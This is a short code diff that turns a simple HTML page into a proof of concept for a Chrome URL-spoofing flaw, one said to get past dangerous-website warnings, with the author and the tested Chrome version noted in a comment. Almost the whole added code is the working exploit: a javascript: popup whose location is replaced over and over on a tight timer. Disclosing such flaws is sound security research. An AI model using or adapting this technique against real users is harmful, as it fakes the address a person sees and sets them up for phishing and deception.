@@ -1,8 +1,20 @@
 <html>
-<body>
-<h1>Click me</h1>
+<head>
+    <title>Chrome Url Spoofing (bypass dangerous website) vulnerability</title>
+    <!--
+        author: evi1m0.bat[at]gmail.com
+        test version: 66.0.3359.170
+    -->
+</head>
 <script>
-  onclick = () => { open('aneh.html') }
+function pwn() {
+    w = window.open(
+            "javascript:document.write('<h1>Url Spoofing!!!</h1>');",
+            "new",
+            "width=500 height=500"
+        );
+    setInterval("w.location.replace('https://wrong.host.badssl.com/');",5);
+}
 </script>
-</body>
+<h1><a href="#" onclick="pwn()">CLICK ME</a></h1>
 </html>
